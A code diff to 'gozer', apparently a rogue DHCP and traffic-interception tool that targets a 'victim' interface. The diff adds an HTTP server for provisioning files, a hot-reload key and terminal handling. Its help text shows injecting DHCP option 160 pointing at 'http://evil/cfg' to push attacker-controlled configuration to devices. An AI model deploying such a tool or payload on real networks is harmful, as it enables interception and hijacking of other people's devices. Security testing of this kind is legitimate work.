@@ -7,15 +7,19 @@
 import os
 import sys
 import json
+import tty
+import select
 import signal
 import logging
 import argparse
 import ipaddress
+import termios
 import threading
 import subprocess
 
 from lib.dhcpd import DHCPServer
 from lib.recon import ReconEngine
+from lib.provd import ProvServer
 
 
 log = logging.getLogger('gozer')
@@ -175,6 +179,14 @@ def cleanup(signum=None, frame=None):
         return
     _cleaning = True
 
+    # restore terminal before printing
+    try:
+        old = _state.get('term_settings')
+        if old:
+            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
+    except Exception:
+        pass
+
     print('\n[*] total protonic reversal achieved - gozer terminated')
 
     proc = _state.get('cap_proc')
@@ -196,6 +208,11 @@ def cleanup(signum=None, frame=None):
         recon.stop()
         print('[*] recon stopped')
 
+    provd = _state.get('provd')
+    if provd:
+        provd.stop()
+        print('[*] provisioning server stopped')
+
     for rule in reversed(_state.get('ipt_rules', [])):
         undo = rule.replace(' -A ', ' -D ', 1)
         subprocess.run(undo, shell=True, capture_output=True)
@@ -215,6 +232,40 @@ def cleanup(signum=None, frame=None):
         print(f'[*] flushed {victim[0]}')
 
     sys.exit(0)
+
+
+def _reset():
+    print('\n[*] resetting...')
+
+    import importlib
+    import lib.recon
+    import lib.dhcpd
+    import lib.provd
+    importlib.reload(lib.recon)
+    importlib.reload(lib.dhcpd)
+    importlib.reload(lib.provd)
+    print('[*] modules reloaded')
+
+    recon = _state.get('recon')
+    if recon:
+        recon.__class__ = lib.recon.ReconEngine
+        recon.reset()
+        if recon._sniffer:
+            recon._sniffer.prn = recon._on_packet
+        print('[*] recon cleared')
+
+    provd = _state.get('provd')
+    if provd and provd._httpd:
+        provd._httpd.RequestHandlerClass = lib.provd.ProvHandler
+        print('[*] provisioning server reloaded')
+
+    srv = _state.get('dhcp')
+    if srv:
+        srv.__class__ = lib.dhcpd.DHCPServer
+        srv.leases.clear()
+        print('[*] leases flushed')
+
+    print('[*] ready\n')
 
 
 def parse_dhcp_opts(raw):
@@ -246,6 +297,7 @@ def main():
     p.add_argument('--capture-filter', metavar='BPF', help='bpf filter for tcpdump')
     p.add_argument('--recon', action='store_true', help='passive recon mode (scapy-based traffic analysis)')
     p.add_argument('--recon-only', action='store_true', help='recon only, skip DHCP/NAT setup')
+    p.add_argument('--serve', metavar='DIR', help='serve provisioning files from DIR over HTTP')
     p.add_argument('--dhcp-option', action='append', metavar='N:V', help='inject custom dhcp option (e.g. 160:http://evil/cfg)')
     p.add_argument('-v', '--verbose', action='store_true')
     args = p.parse_args()
@@ -284,12 +336,21 @@ def main():
         _state['recon'] = recon
         recon.start()
         print(f'[*] recon-only mode on {victim} (pcap: {pcap})')
-        print('[*] ctrl-c to stop')
+        print('[*] ctrl-c to stop, r to reset')
+        old_settings = termios.tcgetattr(sys.stdin)
+        _state['term_settings'] = old_settings
         try:
+            tty.setcbreak(sys.stdin.fileno())
             while True:
-                threading.Event().wait(1)
+                if select.select([sys.stdin], [], [], 1)[0]:
+                    ch = sys.stdin.read(1)
+                    if ch == 'r':
+                        _reset()
         except KeyboardInterrupt:
-            cleanup()
+            pass
+        finally:
+            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
+        cleanup()
         return
 
     print(f'[*] subnet:  {net}')
@@ -312,6 +373,15 @@ def main():
     elif not args.no_capture:
         start_capture(victim, args.capture_filter)
 
+    if args.serve:
+        serve_dir = os.path.abspath(args.serve)
+        if not os.path.isdir(serve_dir):
+            die(f'serve directory not found: {serve_dir}')
+        provd = ProvServer(serve_dir)
+        _state['provd'] = provd
+        provd.start()
+        print(f'[*] provisioning server: {serve_dir} on :80')
+
     extra = parse_dhcp_opts(args.dhcp_option)
     srv = DHCPServer(
         iface=victim,
@@ -325,16 +395,25 @@ def main():
     )
     _state['dhcp'] = srv
 
-    print('[*] gozer is live. ctrl-c to tear down')
+    print('[*] gozer is live. ctrl-c to tear down, r to reset')
 
     t = threading.Thread(target=srv.start, daemon=True)
     t.start()
 
+    old_settings = termios.tcgetattr(sys.stdin)
+    _state['term_settings'] = old_settings
     try:
+        tty.setcbreak(sys.stdin.fileno())
         while t.is_alive():
-            t.join(timeout=1)
+            if select.select([sys.stdin], [], [], 1)[0]:
+                ch = sys.stdin.read(1)
+                if ch == 'r':
+                    _reset()
     except KeyboardInterrupt:
-        cleanup()
+        pass
+    finally:
+        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
+    cleanup()
 
 
 if __name__ == '__main__':
